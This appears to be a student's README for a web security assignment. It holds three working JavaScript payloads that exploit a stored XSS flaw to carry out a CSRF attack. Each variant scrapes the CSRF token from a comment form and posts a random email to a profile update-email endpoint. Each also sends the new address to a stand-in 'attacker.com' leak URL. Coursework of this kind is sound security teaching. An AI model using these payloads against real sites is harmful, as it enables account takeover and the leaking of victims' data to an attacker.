# WebSecurity-CSRF
Web Security Assignment on CSRF


# Script that will exploit the stored XSS vulnerability and trigger a CSRF

Super!
<form id="fake_form" action="" method="POST"> 
  <input type="hidden" id="my_mail" name="email" value=""> 
  <input type="hidden" id="my_csrf" name="csrf" value="">
</form> 


<script> 
  
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    let new_mail = rndMail()
    document.getElementById("my_mail").value = new_mail
    document.getElementById("my_csrf").value = stolen_csrf;
    let fakeForm = document.getElementById("fake_form")


    var formData = new FormData(fakeForm)
    let change_email_url = "http://www.vulnerable.com:5000/profile/update-email"
    fetch(change_email_url, {method: "POST", mode: "no-cors", body:formData}); 


    //attackers logging
    let url = "http://www.attacker.com:5000/leak?newmail=" + new_mail; 
    fetch(url, {method: "GET", mode: "no-cors"});
}
</script>










# Script with axios
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com";
  } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    let new_mail = rndMail()

    //attackers logging
    let url = "http://www.attacker.com:5000/leak?newmail=" + new_mail; 
    fetch(url, {method: "GET", mode: "no-cors"});

    let bodyFormData = new FormData();
    bodyFormData.append('csrf', stolen_csrf);
    bodyFormData.append('email', new_mail);

    axios.post('http://www.vulnerable.com:5000/profile/update-email', bodyFormData, {
        headers: {
            'Content-Type': 'application/json'
        }
    })
}
</script>





# Previous working script with form submit
Super!
<form id="fake_form" action="http://www.vulnerable.com:5000/profile/update-email" method="POST"> 
  <input id="my_mail" name="email" value=""> 
  <input id="my_csrf" name="csrf" value=""> 
</form> 

<script> 
 
  function rndMail() {
    return "test@" +  Math.floor(Math.random() * 100) + ".com"; 
 } 
 
  window.onload = function() { 

    let stolen_csrf = [...document.getElementsByTagName("form")].filter((f) => {
    return f.action.includes("/comment");
  })[0].children[0].value;
 
    let new_mail = rndMail()
    document.getElementById("my_mail").value = new_mail
    document.getElementById("my_csrf").value = stolen_csrf;

    //attackers logging
    let url = "http://www.attacker.com:5000/leak?newmail=" + new_mail; 
    fetch(url, {method: "GET", mode: "no-cors"});


    let fakeForm = document.getElementById("fake_form");
    fakeForm.submit(); 
}
</script>